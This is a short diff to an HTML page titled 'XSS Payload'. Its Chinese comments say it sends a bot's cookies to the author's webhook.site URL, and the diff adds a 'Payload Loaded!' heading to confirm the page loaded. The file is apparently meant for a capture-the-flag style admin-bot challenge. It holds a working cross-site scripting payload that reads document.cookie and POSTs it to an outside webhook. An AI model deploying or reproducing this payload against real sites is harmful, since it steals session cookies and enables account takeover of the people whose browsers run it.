@@ -2,13 +2,14 @@
 <html>
 <head><title>XSS Payload</title></head>
 <body>
-<script>
-// 把机器人的 Cookie 发送到你的 webhook.site
-fetch('https://webhook.site/5a1b2c3d-4e5f-6g7h-8i9j-0k1l2m3n4o5p', {
-    method: 'POST',
-    body: document.cookie,
-    headers: { 'Content-Type': 'text/plain' }
-});
-</script>
+    <h1>✅ Payload Loaded!</h1> <!-- 加上这行，方便确认页面加载了 -->
+    <script>
+        // 把机器人的 Cookie 发送到你的 webhook.site
+        fetch('https://webhook.site/5a1b2c3d-4e5f-6g7h-8i9j-0k1l2m3n4o5p', {
+            method: 'POST',
+            body: document.cookie,
+            headers: { 'Content-Type': 'text/plain' }
+        });
+    </script>
 </body>
 </html>
